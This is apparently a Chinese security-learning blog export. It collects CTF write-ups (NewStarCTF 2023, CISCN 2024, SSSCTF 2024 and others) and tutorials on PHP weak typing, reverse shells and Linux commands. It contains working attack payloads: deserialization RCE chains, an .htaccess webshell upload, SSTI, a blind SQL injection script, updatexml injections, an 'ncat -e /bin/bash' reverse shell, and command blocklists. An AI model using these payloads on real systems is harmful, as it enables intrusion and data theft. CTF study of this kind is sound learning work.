if(strcmp($_GET['key4'],file_get_contents(&quot;/flag&quot;)) == 0){ $flag3 = True; }else{ die(&quot;nope,this is level 3&quot;); } }}// 变量输出的特性，当字符串被当做数字输出时，会截取第一个非数字的字符前的所有数字，若第一个是非数字字符，则会输出0if($flag3){ echo &quot;=Level 4=&lt;br&gt;&quot;; if(isset($_GET['key5'])){ if(!is_numeric($_GET['key5']) &amp;&amp; $_GET['key5'] &gt; 2023){ $flag4 = True; }else{ die(&quot;nope,this is level 4&quot;); } }}// extract函数的变量覆盖漏洞，当传入的数据经过此函数处理时，若数据中含有脚本中相同的变量名，那么该数据会覆盖原来的变量。这里有变量$flag5，所以可以传入flag5=...（只要变量值不含字母数字即可）if($flag4){ echo &quot;=Level 5=&lt;br&gt;&quot;; extract($_POST); foreach($_POST as $var){ if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var)){ die(&quot;nope,this is level 5&quot;); } } if($flag5){ echo file_get_contents(&quot;/flag&quot;); }else{ die(&quot;nope,this is level 5&quot;); }} 参考payload：GET /?key1[]=1&amp;key2[]=2&amp;key4[]=1&amp;key5=2024s、POST key3[]=1&amp;flag5=. [NewStarCTF 2023 公开赛道]泄漏的秘密直接找www.zip即可 [NewStarCTF 2023 公开赛道]R!!C!!E!!git信息泄露，用Githack可以得到文件 1234567891011&lt;?phphighlight_file(__FILE__);if (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['star'])) { // 这里检查的是$star是否符合非标点符号以外的字符+递归函数的调用与替换 //说的清楚点，[^\\W]是匹配非标点以外的任何字符，这里的作用应该是匹配函数名 // \\((?R)?\\)转义字符\\不用关心，转换下来就是((?R)?)，(?R)?表示匹配嵌套的函数，但是函数的参数无法处理 // 当$star符合函数名加嵌套函数时，就可以进入到下一步了 if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){ eval($_GET['star']); }} 综上，这是一道无参RCE，我们只需要引用函数并理解如何嵌套函数即可 由于scandir、var_dump、get_defined_vars被过滤，且函数处理不了参数，这时候可以考虑getallheaders() 传入?star=eval(next(getallheaders()));，这里是先获取HTTP请求头的信息，然后用next()调用下一个元素（指请求头中的某个元素），把这个元素当做参数传给eval()执行（这里eval是能处理参数的，因为它匹配的是[^\\W]，而next(getallheaders())匹配的是(?R)?，不能处理参数，只能调用函数） 发现目标是修改UA（User-Agent），然后命令执行即可 [NewStarCTF 2023 公开赛道]Upload again!过滤了php后缀的文件，同时还对文件内容作检查，用&lt; script language=”php” &gt;绕过 这里我们不能直接访问1.jpg来getshell，需要用.htaccess文件，该文件可以实现的功能包括但不限于：用户自动重定向、自定义错误页面、改变你的文件扩展名等等。 12SetHandler application/x-httpd-php 上传后访问1.jpg即可getshell [NewStarCTF 2023 公开赛道]Unserialize？1234567891011121314151617&lt;?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserialize?class evil { private $cmd; public function __destruct() { if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd)){ @system($this-&gt;cmd); } }}@unserialize($_POST['unser']);?&gt; 简单的反序列化，注意上传的时候要URL编码 12345678&lt;?phpclass evil { private $cmd = 'nl /*';}$a = new evil();echo(urlencode(serialize($a)));?&gt; （还没测试，在写题目的时候平台正在维护，于是就跑步去了） （平台有点问题，我还以为写错了，把wp搬上去之后发现也没有回显） [NewStarCTF 2023 公开赛道]include 0。0文件包含有多种方法，这里就说最常见的一个：伪协议base64编码直接读取 源码过滤了base，用url双编码绕过：?file=php://filter/read=convert.bas%256564-encode/resource=flag.php（把e编码两次） [NewStarCTF 2023 公开赛道]游戏高手在控制台内将gameScore改为100000以上的数字就行（gameScore可以在调试器内看） [NewStarCTF 2023 公开赛道]GenShin抓包发现响应头有文件 根据提示传一个name进去 也许是ssti，看看有没有 被过滤了，应该是存在ssti的。 测试发现%没有被过滤，可以用{%print%}输出 看看子类有什么可以用的 由于init被过滤掉了，考虑用attr绕过 找到popen之后就可以操作了 :::info 这题我没有检测出来空格是否被过滤掉，因为cat /flag中间有空格会报400，不知是什么原因。 对了，popen也被过滤掉了 ::: [NewStarCTF 2023 公开赛道]R!!!C!!!E!!!12345678910111213141516171819202122&lt;?phphighlight_file(__FILE__);class minipop{ public $code; public $qwejaskdjnlka; public function __toString() { if(!preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\{|\\}|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this-&gt;code)){ exec($this-&gt;code); } return &quot;alright&quot;; } public function __destruct() { echo $this-&gt;qwejaskdjnlka; }}if(isset($_POST['payload'])){ //wanna try? unserialize($_POST['payload']);} :::warning exec函数在浏览器中是没有反应的，所以只能靠写文件的方式把命令的运行结果表示出来 ::: 脚本如下： 12345678910&lt;?phpclass minipop{ public $code = &quot;ls /|te''e /var/www/html/2.txt&quot;; public $qwejaskdjnlka;}$a = new minipop();$a-&gt;qwejaskdjnlka = $a;echo(serialize($a));?&gt; [NewStarCTF 2023 公开赛道]medium_sql过滤的部分可以考虑大小写绕过 由于在考虑联合注入的时候提示说不能用union，那多半是盲注了 测试一下布尔盲注 确认出是布尔盲注，可以写脚本了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108import requestsurl = 'http://b1e9c46d-af66-4936-a026-9b3a1a236c3c.node5.buuoj.cn:81/?id=TMP11503\\' And 'def check(res): if 'compulsory' in res.text: return True return Falsedef checklength(): for i in range(1,20): payload = 'if((length(database())={}),1,0)--+'.format(i) str2 = url + payload # print(str2) res = requests.get(url=str2) if check(res): print('Database\\'s length is :', i) breakdef checkdataname(): databasename = '' for i in range(1,10): left = 32 right = 127 mid = (left + right) // 2 while left &lt; right: payload = 'if((asCii(suBstr(database(),{},1)))&gt;{},1,0)--+'.format(i,mid) str3 = url + payload # print(str3) res = requests.get(url=str3) if check(res): left = mid + 1 else: right = mid mid = (left + right) &gt;&gt; 1 databasename += chr(mid) print(databasename)def checktable(): tablename = '' for i in range(1,60): left = 32 right = 127 mid = (left + right) &gt;&gt; 1 while(left&lt;right): payload = 'if((asCii(Substr((selEct groUp_Concat(tabLe_nAme) frOm infOrMation_schEma.taBles whEre tabLe_Schema = database()),{},1)))&gt;{},1,0)--+'.format(i,mid) str4 = url + payload # print(str4) res = requests.get(url=str4) if check(res): left = mid + 1 else: right = mid mid = (left + right) &gt;&gt; 1 tablename += chr(mid) print(tablename)def checkcolumn(): columnname = '' for i in range(1,80): left = 32 right = 127 mid = (left + right) &gt;&gt; 1 while(left&lt;right): payload = 'if((asCii(Substr((selEct groUp_Concat(column_nAme) frOm infOrMation_schEma.columns whEre tabLe_name = \\'here_is_flag\\'),{},1)))&gt;{},1,0)--+'.format(i,mid) str5 = url + payload # print(str5) res = requests.get(url=str5) if check(res): left = mid + 1 else: right = mid mid = (left + right) &gt;&gt; 1 columnname += chr(mid) print(columnname)def checkflag(): flag = '' for i in range(1,80): left = 32 right = 127 mid = (left + right) &gt;&gt; 1 while(left&lt;right): payload = 'if((asCii(Substr((selEct flag from here_is_flag),{},1)))&gt;{},1,0)--+'.format(i,mid) str6 = url + payload # print(str6) res = requests.get(url=str6) if check(res): left = mid + 1 else: right = mid mid = (left + right) &gt;&gt; 1 flag += chr(mid) print(flag)# checklength()# 3# checkdataname()# ctf# checktable()# grades,here_is_flag# checkcolumn()# flag# checkflag()# flag{845ef206-8555-440b-a654-6cfa251cf139}","link":"/2024/03/20/buuctf/buu/"},{"title":"学习web安全的那些二三事-php篇（1）","text":"从大一入学学习安全到现在，我已经见识到许多基本漏洞以及这些漏洞的变形，这里就写几篇博客总结一下这段时间的学习，顺便也记录一下一些漏洞，以便查看 这里从一些常见的php的语言特性和函数开始说起 1.intval细说一下intval的具体用法 1intval(mixed $value, int $base = 10) intval用于获取变量的整数值，$value为任意类型的变量，后面为进制数，意思是经过转化后输出该进制的数，如果没有数或者输入的数为0，则默认为十进制 这里罗列了以下几种输入（注释内容为intval转化后的内容）： 1234567891011&lt;?php$a = 1; // 1$b = 1.1; // 1$c = '1c';// 1$d = 'c1';// 0 $j = '2543sqd';// 2543$e = 2e10;// 20000000000$f = '2e10'; // 20000000000$g = array(); // 0$h = array(12); // 1$i = array('1ad','wd'); // 1 这里说一下e和f $e作为一个浮点数，因为它使用了科学计数法，2e10代表2 * 10^10^，如果超出范围，则会输出0或者其他不确定的数（这里不是随机数，每一个数对应一个定值） $f作为一个字符串，intval会先将其转化为数字然后再作进一步修改，如果转化后的数超出范围，则取最大的整数 有的ctf招新会这样出： 123456789101112&lt;?php$num = $_GET['num'];if(!preg_match(&quot;/[0-9]/&quot;,$num)){ if(intval($num)){ echo $flag; }else{ die(&quot;easy php!&quot;); }}else{ die(&quot;hacker!&quot;);}?&gt; 这里就可以利用上述例子提到的数组绕过 不过get传数组跟php里面传数组时处理的结果会不一样，get传参对数组的处理似乎有点复杂？（找时间复现一下然后加在这下面），而php里面，由于已经明确要传递空数组，因此判断方便（目前只能大体说说） num就可以这样赋值：num[]=（啥都行） 2.弱类型比较我们常见的弱类型比较就是==了 当数据在使用==，php会“悄悄”把数据类型进行转化，这样就不用其他的数据转化脚本。 这种“悄悄”的转化方式称为隐式类型转换，它应用于很多编程语言，例如c，javascript等 在8.0版本以前，==的处理比较简单，举个栗子 123456789var_dump('234' == 234); // bool(true)var_dump('234s'== 234);// bool(true)var_dump('ss' == 0);// bool(true)var_dump('ss1' == 0);// bool(true)var_dump('1ss' == 0);// bool(false)var_dump('0x9' == 9);// bool(false)var_dump(0x9 == 9);// bool(true)var_dump('2e3' == 2000);// bool(true)var_dump(2e3 == 2000);// bool(true) 这里的弱比较相当于在两端加上了intval 在8.0版本以后，开发者对==进行优化，对于数值字符串有一个很好的转换方法： 若字符串符合数值字符串的定义，则直接作为字符串进行比较. 若字符串不符合数值字符串的定义，则将数值转化为字符串后再进行比较。 数值字符串是指一个包含数字字符的字符串，而像0x7，0b1100110这种有明确进制标识符的不是数值字符串（当然，要符合进制的要求） :::warning 如果像0x9这种数值被包上引号后则会被标识为数值字符串（这么说会感觉有点矛盾），没有被包上引号则作为数值出现 ::: 以上数据输出如下： 123456789var_dump('234' == 234); // bool(true)var_dump('234s'== 234);// bool(false)var_dump('ss' == 0);// bool(false)var_dump('ss1' == 0);// bool(false)var_dump('1ss' == 0);// bool(false)var_dump('0x9' == 9);// bool(false)var_dump(0x9 == 9);// bool(true)var_dump('2e3' == 2000);// bool(true)var_dump(2e3 == 2000);// bool(true) 更多内容的可以看看这个博客 附上几种数值的常见标识符： 二进制（0b），八进制（0），十六进制（0x），科学计数法（[0-9]e） 有的比赛会根据弱比较类型来考怎么绕过，这里列几个比较常见的 md5绕过对于md5而言，目前还没有一个好的算法来对md5编码进行解密，很多网站上的md5解密实际上是通过查询变量的md5值来进行破解的。说白了，破解者通过某些算法来生成字典并对这个md5进行爆破。因此，想通过某一个md5的值来破解得到明文在算法上并不可行 当md5出现在php时，又该怎么应对呢 一道经典的题型如下： 12345&lt;?phpif($_GET['a'] != $_GET['b'] &amp;&amp; md5($_GET['a']) === md5($_GET['b'])){ echo $flag;}?&gt; 对于这种题，我们可以采用数组绕过，因为md5对数组编码后返回为空，我们只需要让数组名不同就行 特别地，若题目变成这样 12345&lt;?phpif($_GET['a'] != $_GET['b'] &amp;&amp; md5($_GET['a']) == md5($_GET['b'])){ echo $flag;}?&gt; 由于弱比较的特性，我们可以通过爆破来传入相应的值。之前有个例子提到关于科学计数法，e是个比较特殊的字母，我们可以利用0e来进行绕过（毕竟0乘任何数都是0） 根据这个，我们可以查询哪些数值或字符串能够在md5编码后开头为0e :::info 可以思考一下[0-9]e后如果先接字符后数字或者先数字再字符时会输出什么 ::: 3.preg_matchpreg_match用于执行匹配正则表达式，说白了就是查找选定字符串中有没有能匹配得上正则表达式部分的。这个只需知道如何看出匹配哪些字符就行，根据条件来写传入的数据 php文档给出的匹配模式如下： 1234567891011121314151617181920212223242526272829[abc] 单个字符：a、b 或 c[^abc] 任何单个字符，但不是 a、b 或 c[a-z] 范围 a-z 内的任何单个字符[a-zA-Z] 范围 a-z 或 A-Z 内的任何单个字符^ 行首$ 行尾\\A 字符串的开头\\z 字符串的结尾. 任意单个字符\\s 任意空白字符\\S 任意非空白字符\\d 任意数字\\D 任意非数字\\w 任意单词字符（字母、数字、下划线）\\W 任意非单词字符\\b 任意单词边界字符(...) 捕获括号内的所有内容(a|b) a 或 ba? 零个或一个 aa* 零个或多个 aa+ 一个或多个 aa{3} 正好 3 个 aa{3,} 3 个或更多 aa{3,6} 3 到 6 个 ai 不区分大小写m 使点号匹配换行符x 忽略正则表达式中的空白o 仅进行一次 #{...} 替换 例如preg_match(/[a-z][A-Z][0-9]/, $a)表示的是查看$a中是否含有字母和数字，其中字母包含大小写 在审计这种代码时，需要记住匹配模式中每一个正则表达式表示的是什么 这里拿一个ctfshow的题目出来说说 1234567891011121314&lt;?$a=$_GET['cmd'];if(preg_match('/^php$/im', $a)){ if(preg_match('/^php$/i', $a)){ echo 'hacker'; } else{ echo $flag; }}else{ echo 'nonononono';} ?&gt; 第一层匹配是查询所有行中是否至少有一行是php，第二层则是查询第一行中是否只有php 在/i模式下只能匹配一行，但是加了/m后，php就会解析每一行 因此可以传入cmd=php%0a123，其中%0a为换行符的url编码 :::info 可能有同学会不理解第一次和第二次都能过，因为在/im模式下，php会将%0a识别为换行符，因此我们穿的一行数据在经过解析之后实际上是两行数据；而在/i模式下，%0a只是一个普通的字符串而已 之前也提过，preg_match('/^php$/im', $a)是检查某一行中的从头到尾是否是php，这就意味着你有一行只能是php ::: 额外补充一个strpos用于查找某个字符或某个字符串在某个变量中第一次出现的位置，当匹配字符串时，返回变量中匹配的字符串的第一个字符的位置 1234567&lt;?php$a = '010101';echo(strpos($a,'0')); // 0echo(strpos($a,'1')); // 1echo(strpos($a,'2')); // 无输出echo(strpos($a,'010')); // 0?&gt; 4.highlight_file官方文档给出的用法：highlight_file([string] $filename, [bool] $return = false): [string]|[bool] 我们用到的highlight_file一般用于高亮一个文件（展示一个文件的内容并将对应的代码块进行高亮），因此bool类型一般不会用到 而$filename传入的实际上是文件的地址 5.file_put_contentsphp官方文档：file_put_contents( [string] $filename, [mixed] $data, [int] $flags = 0, [?][resource] $context = **null**`): [int]|[false]`` 其中主要的是filename，需要对内容进行写入的文件（传的是文件名而非地址，注意和其他函数的区别），data就是写入的内容 file_put_contents用于向一个文件里面写内容，针对的是当前目录下的文件，如果当前目录下存在目标文件名，则将该文件进行覆盖重写，反之则创建一个新文件并将内容写入其中 6.call_user_funcphp官方文档： call_user_func([callable] $callback, [mixed] ...$args): [mixed] call_user_func把第一个参数作为回调函数调用 :::info no-icon 回调：一个过程，将某个函数作为参数放到另外一个函数中，当另外一个函数执行完后，再转过头来执行这个函数 而回调函数实际上是一个参数 ::: 第一个传递的是php的函数，例如eval，hex2bin等 第二个传递的是回调函数的参数","link":"/2024/06/25/Webbbb/PHP/php-first/"},{"title":"学习web安全的那些二三事-反弹Shell篇","text":"反弹Shell也是一个需要掌握的技巧（实际上我也没掌握到多少，还搞得好混乱，只有找题来看看） 在有反弹shell之前，技术人员连接目标机器采用的是老早的传统连接方法，例如有Telnet、ssh、远程桌面协议等等，还有其他的第三方远程管理工具如VNC与一些批处理脚本。这些连接方式可以称为主动连接。 不过，有的目标机器会有一些限制： 目标机器对连接进行了限制，即允许出站连接，但限制了很多入站连接，这作用与内网无异； 目标机器的某端口被占用，由于其本身的防火墙策略会导致ssh连接被阻断； 目标机器的ip是动态的，或者处于内网状态下（即目标机器处于局域网之中，ip地址由NAT管理）； 反弹shell就是为了绕过上述条件而产生的，原理就是让目标机器主动连接外部设备。 反弹shell的方法有很多种，包括但不限于python脚本反弹，netcat反弹，bash反弹等等。 :::info 以下图示都是以kali作为攻击机来反弹shell，目标机器是ubuntu或者windows，图示会有说明 ::: netcat反弹shell这个就比较简单粗暴了： 1234567ncat &lt;ip&gt;&lt;port&gt; -e /bin/bash# nc是netcat的缩写，它们跟ncat的不同之处是：# netcat比较传统，ncat比较现代化，说白了，ncat能做netcat所有能做的事# 标注一下：ncat实际上是nmap的一部分，由nmap团队维护# 不过不同发行版的nc似乎不同呢，ubuntu和kali就不太一样# 比如这个-e，意思是在连接到目标端口后执行某一条命令，不过ubuntu没有这个选项# 所以最好用ncat 左侧是kali，右侧是ubuntu （正常情况来说是会显示用户名+主机名的，但是这里不知道为什么显示不出来） windows应该是自带有bash的，也可以利用其来反弹shell 左侧为kali，右侧为windows powershell 这里说一下攻击机的bash命令 1234nc -lvp &lt;port&gt;\\# -l：监听模式，即nc会监听指定的端口，等待连接；# -v：详细模式，用于打印更多信息；# -p：端口号，即输入的监听端口号；","link":"/2024/07/03/Webbbb/Others/Shell/"},{"title":"ssti-First","text":"最近在回顾自己所学时发现有很多地方还是没有学通，比如ssti，xss等，这里就先学一下ssti吧","link":"/2024/06/04/Webbbb/SSTI/ssti-First/"},{"title":"学习web安全的那些二三事-linux篇（1）","text":"这一部分主要讲的是linux。 为什么要讲linux呢？因为要用，其重要性不言而喻。 （这些命令基于我在做运维和CTF题时总结的，有的因为年代久远忘记了，目前正在恢复中，遇到什么补上什么） linux中常用的几个命令按功能分类来说比较好一点，这样就可以知道在某些命令被过滤的情况下有哪些命令可以替代使用 文件目录和操作 ls：展示某个目录下的所有子目录以及文件（隐藏文件默认不展示），如果后面没有跟路径名，则默认展示当前目录； cd：进入某个目录下，后面需要跟路径名 pwd：输出当前目录的绝对路径 mkdir/rmdir：创建一个目录 cp：将某个文件或目录复制到另外一个文件或目录 mv：移动或重命名某个文件或目录 find：查找文件或目录，输出其地址 tree：显示目录的分支结构 TO BE ADDED 这里主要说一下ls的常用选项： -a 显示目录下所有的文件（包括隐藏文件） -l 将列出的文件以长格式输出 -R 列出目录下的所有子目录和文件，若子目录中还有文件或子目录，则重复当前操作 :::info 在大多数linux系统中，ls加部分选项是可以简写的，如ls -l可以简写成ll； ::: 文件内容和查看 cat/tac：前者按行号正序输出文件内容，后者按行号倒序输出文件内容； more/less：分页显示文件内容 head/tail：默认情况下前者显示文件的前十行，后者显示文件的后十行 nl：显示文件内容并标明行号 touch：创建文件 rm：和rmdir差不多，不过这里针对的是文件 vi/vim：编辑文件 TO BE ADDED :::warning no-icon 这里的三个命令被称为linux文本处理三剑客，具体用法可以上网搜搜，这里只给出简单的例子 grep： awk： sed： 实际上，”三剑客“对于查找数据有着重要作用，如果能通过它们将其他命令灵活结合起来，那么我们就可以快速地从一堆冗余的文字中提取我们想要的数据，从而节省了许多时间。 我还不怎么会用，特别是条件的编写 当然了，它们也能对文本进行增、删、改，具体的呢就上网查查叭 ::: 权限管理 chmod：更改文件和目录的权限 chown：更改文件和目录的拥有者 passwd：更改某用户的密码 sudo：以管理员身份执行某条命令 TO BE ADDED 压缩与打包 tar：打包某个文件或目录（有的博客会说它有压缩和解压功能，实际上它本身并不具有这些功能，只能通过调用其他其他的功能来完成这一过程） gzip：将打包后的文件或目录进行压缩（一般后缀是tar.gz，因为它一般都是压缩tar文件） zip/unzip：压缩或解压缩zip文件 TO BE ADDED 网络管理 wget/curl：从某个网站中获取文件或其他信息 netstat：显示网络连接信息 nc：连接目标主机的终端 ping：检测本地与目标的网络是否通畅 ssh：本地远程登录目标主机 TO BE ADDED 进程管理 ps：查看进程信息，ps aux则是查看所有进程的信息 kill：停止进程的运行 TO BE ADDED 其他 whoami：查询自己是哪一位用户 echo：显示指定的文字，一般与重定向使用 TO BE ADDED 额外哆嗦的一些命令文件内容和查看 sort：给文件的每一行进行排序，默认是字典排序 uniq：将文件内容进行去重后输出 od：把文件转换成某种形式输出，包括字符，ascii，二进制，八进制，十六进制 :::warning 上面几个命令不会直接对文件内容作任何更改的，只是输出的内容可能跟文件内容不一样 ::: strings：查找文件中指定内容并输出，默认情况下是查找长度至少为4的字符串 cut：按照输入的条件选取文本内容进行输出 paste：将指定的文件以列为单位进行合并并输出","link":"/2024/06/25/Webbbb/linux/linux-first/"},{"title":"linux-second","text":"这里开始针对命令的一些骚操作了（顺序按字典排序） curl上次提到过，curl是用于在请求一个web服务器，也可以用于下载服务器上的文件，可以是一个网址，也可以是一个ip 一般情况下是这样的： 但是在输入ip时，你也可以将.换成。，对下列操作没有任何影响 这里猜测是url在检查的时候把。自动切换了为.","link":"/2024/06/27/Webbbb/linux/linux-second/"},{"title":"dasctf_gfctf四月赛复现","text":"WEBcool_index这道题当时看了看，以为是jwt伪造，结果发现不能改token，因为动token会导致系统执行res.clearCookie(&quot;token&quot;);，因此伪造方面只能放一放 这里主要分析/article，它是读取flag的关键 12345678910111213141516171819202122232425262728app.post(&quot;/article&quot;, (req, res) =&gt; { const token = req.cookies.token; if (token) { try { const decoded = jwt.verify(token, JWT_SECRET); let index = req.body.index; if (req.body.index &lt; 0) { return res.status(400).json({ message: &quot;你知道我要说什么&quot; }); } if (decoded.subscription !== &quot;premium&quot; &amp;&amp; index &gt;= 7) { return res .status(403) .json({ message: &quot;订阅高级会员以解锁&quot; }); } index = parseInt(index); if (Number.isNaN(index) || index &gt; articles.length - 1) { return res.status(400).json({ message: &quot;你知道我要说什么&quot; }); } return res.json(articles[index]); } catch (error) { res.clearCookie(&quot;token&quot;); return res.status(403).json({ message: &quot;重新登录罢&quot; }); } } else { return res.status(403).json({ message: &quot;未登录&quot; }); }}); 其实你把整个server.js看完之后，感觉没有利用点，因为开发者对token进行了严格地检查，防止攻击者利用token来绕过管理员的权限读取flag 不过注意到index = parseInt(index);，parseInt()用于将字符串转换为数字 转换原理跟php差不多，就不赘述了 由于这一句是放在检测身份和页面之后的，因此可以直接传入含数字的字符串来访问flag EasySignin注册一个账号登录进去，修改密码时抓包，把username改为admin 重新登录后查看图片，注意到url那一栏可以利用SSRF 试了一下，本地文件是读不了的，因此没法用file://，那就试试gopher:// 发现可以打3306，即mysql的默认端口 用gopherus打一下 得到的payload进行二次编码，因为这里面有的字符解码后是个乱码，服务器在将其经过解码后可能会出现payload失效的情况 解码后得到flag SuiteCRM提示已经说了是CVE-2024-1644，跟着复现就好了 由于环境修改了upload目录的上传权限，我就用最近才学的pear文件包含来执行命令 直接读取flag web1234这题附件不知道跑哪去了，只能看看wp了","link":"/2024/04/22/competition/202404/dasctf-gfctf/"},{"title":"ciscn2024","text":"WEBsimple_php123456789101112131415 &lt;?phpini_set('open_basedir', '/var/www/html/');error_reporting(0);if(isset($_POST['cmd'])){ $cmd = escapeshellcmd($_POST['cmd']); if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\\?|wget|\\'|\\&quot;|id|whoami/i', $cmd)) { system($cmd);}}show_source(__FILE__);?&gt; 这题把flag放到数据库有点没想到 本题开始通过escapeshellcmd直接把符号过滤了，加上一大串命令的waf显得对这道题有点力不从心 有一个思路是可以利用php命令将后面输入语句进行解析并执行，这里就涉及到对linux命令的掌握程度了捏，当然了也可以用paste和rev paste帮助文件如下： rev帮助文件如下： rev就是把文件里的每一行进行倒序输出： 这里用paste 直接查看/etc/passwd 有mysql的记录，可以试试能不能运行mysql命令 然后开始rce（原本想反弹shell的，但是不知道为什么就是出不来，只能rce了） 这里用到截断字符串的命令（我先列出sql的查询语句） 123echo `mysql -uroot -proot -e &quot;show databases&quot;`;echo `mysql -uroot -proot -e &quot;use PHP_CMS;show tables&quot;`;echo `mysql -uroot -proot -e &quot;use PHP_CMS;SELECT * FROM F1ag_Se3Re7&quot;`; easycms之前扫过一遍，有敏感目录flag.php和Readme.txt，提示说flag.php如下： 123456if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;){ echo &quot;Just input 'cmd' From 127.0.0.1&quot;; return;}else{ system($_GET['cmd']);} $_SERVER[&quot;REMOTE_ADDR&quot;]返回的是真实的ip地址，没法伪造，但是存在SSRF 查看Readme.txt 有乱码，用wget获取 下载cms后看看它的漏洞报告 有关SSRF的是这个： 顺着源码查找一下qrcode，最终可定位到/dayrui/Fcms/Control/Api/Api.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445public function qrcode() { $value = urldecode(\\Phpcmf\\Service::L('input')-&gt;get('text')); $thumb = urldecode(\\Phpcmf\\Service::L('input')-&gt;get('thumb')); $matrixPointSize = (int)\\Phpcmf\\Service::L('input')-&gt;get('size'); $errorCorrectionLevel = dr_safe_replace(\\Phpcmf\\Service::L('input')-&gt;get('level')); //生成二维码图片 require_once CMSPATH.'Library/Phpqrcode.php'; $file = WRITEPATH.'file/qrcode-'.md5($value.$thumb.$matrixPointSize.$errorCorrectionLevel).'-qrcode.png'; if (!IS_DEV &amp;&amp; is_file($file)) { $QR = imagecreatefrompng($file); } else { \\QRcode::png($value, $file, $errorCorrectionLevel, $matrixPointSize, 3); if (!is_file($file)) { exit('二维码生成失败'); } $QR = imagecreatefromstring(file_get_contents($file)); if ($thumb) { if (strpos($thumb, 'https://') !== false &amp;&amp; strpos($thumb, '/') !== false &amp;&amp; strpos($thumb, 'http://') !== false) { exit('图片地址不规范'); } $img = getimagesize($thumb); if (!$img) { exit('此图片不是一张可用的图片'); } $code = dr_catcher_data($thumb); if (!$code) { exit('图片参数不规范'); } $logo = imagecreatefromstring($code); $QR_width = imagesx($QR);//二维码图片宽度 $logo_width = imagesx($logo);//logo图片宽度 $logo_height = imagesy($logo);//logo图片高度 $logo_qr_width = $QR_width / 4; $scale = $logo_width/$logo_qr_width; $logo_qr_height = $logo_height/$scale; $from_width = ($QR_width - $logo_qr_width) / 2; //重新组合图片并调整大小 imagecopyresampled($QR, $logo, (int)$from_width, (int)$from_width, 0, 0, (int)$logo_qr_width, (int)$logo_qr_height, (int)$logo_width, (int)$logo_height); imagepng($QR, $file); } } 分析之后发现$thumb可控，因为这里的相关信息是填的图片地址 注意到$code = dr_catcher_data($thumb); 定位到/dayrui/Fcms/Control/Core/Helper.php 根据api.php构造payload： index.php?c=api&amp;s=api&amp;m=qrcode&amp;text=111&amp;size=1024&amp;level=1&amp;thumb=http://127.0.0.1/flag.php （为什么会这样构造可以看看Fcms下的init.php,然后再结合Api.php看看） 但是没有输出，只有一个二维码，扫出来只有text的内容 尝试使用302跳转来反弹shell （先放着，我弄了好久都没弄出来）","link":"/2024/05/27/competition/202405/ciscn2024/"},{"title":"sssctf2024-复现","text":"计费系统 这一页是没有注入的，只能sso登录 登陆之后直接进入/Self/service/myMac路由下寻找信息（前面的信息寻找过程略），发现存在隐写字符 这里要注意一下，零宽隐写字符的加密解密需要在同一个网页进行，说白了，用啥工具加密就用啥工具解密，当时做的时候忙着找各种网站尝试解密了，后面才试出来（所以下面的第一个工具会解出来乱码） 去到/Administrator/Login中查看信息 这里可能存在sql注入，可以尝试闭合 这里试出来是&quot;闭合，根据返回的信息推测是布尔盲注 直接上payload 12341&quot; and updatexml(1,concat(0x7e,(select database()),0x7e),1);# # ChallengeDatabase1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = 'ChallengeDatabase' limit 0,1),0x7e),1);# # users1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name = 'users' limit 0,1),0x7e),1);# # id,loginip,name,password,sso1&quot; and updatexml(1,concat(0x7e,substring((select password from users limit 0,1),0,40),0x7e),1);# 这里由于最大长度的限制，所以用到了substring来截取密码，把起始点和截取长度改一下就行 得到05d1b851-ef06-4460-9c30-4249086631d3 得到账户名和密码后发现以下界面 抓个包看看 注意到一个dashboard跳转，发现一个之前界面中没有的aes.js 查看发现有以下脚本 123456789// const aes256cbcDecrypt = (encryptedData, key, iv) =&gt; {// const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);// return decryptedData;// };// const key = &quot;a1e7091c4f39e1571f5d4eaf08c7b28c&quot;;// const iv = &quot;e8d4f92b75f64e7c&quot;;// function readtokens(token) {// return aes256cbcDecrypt(token, key, iv);// } 这里用到了aes256cbc方式加密，可能在之前的界面中有输出，回去看一下 发现一串可疑字符串，猜测就是该加密方式下的密文，拿去解密一下 根据题目描述，所有账户的密码相同，flag为flag账户的密码，因此我们的账户密码也是flag，上面一串字符串就是 脚本如下： 123456789101112131415161718192021222324def decipher_sssctf(str): PRIMENUM1_SSSCTF = 100537 KEYWORD_SSSCTF = 45452 MIN_ASC = 32 MAX_ASC = 126 NUM_ASC = MAX_ASC - MIN_ASC + 1 result = &quot;&quot; for i in range(len(str) - 1): ch = ord(str[i]) if MIN_ASC &lt;= ch &lt;= MAX_ASC: ch -= MIN_ASC offset = round((NUM_ASC + 1) * ((KEYWORD_SSSCTF * (i + 1)) % PRIMENUM1_SSSCTF) / PRIMENUM1_SSSCTF - 0.5) ch = (ch - offset) % NUM_ASC if ch &lt; 0: ch += NUM_ASC ch += MIN_ASC result += chr(ch) return result# 示例用法decrypted_string = decipher_sssctf(&quot;~Ju1m++tij_^%R!Cz@;e\\/(TOutE&gt;9.`.XSLKt@nf8asa&quot;)print(&quot;Decrypted String:&quot;, decrypted_string) 根据之前出题人的提示，说可以爆出来。当时也尝试过，可惜的是解密算法没有写对，所以没有爆出来。。。 （当时考虑了keyword有可能是字符串的原因，所以后面就没怎么想了） scr1wgpt这里根据提示，发现过滤了or和and，考虑用||和&amp;&amp;绕过；由于登录界面只有login failed，所以考虑时间注入 脚本如下：（环境有点问题，略) 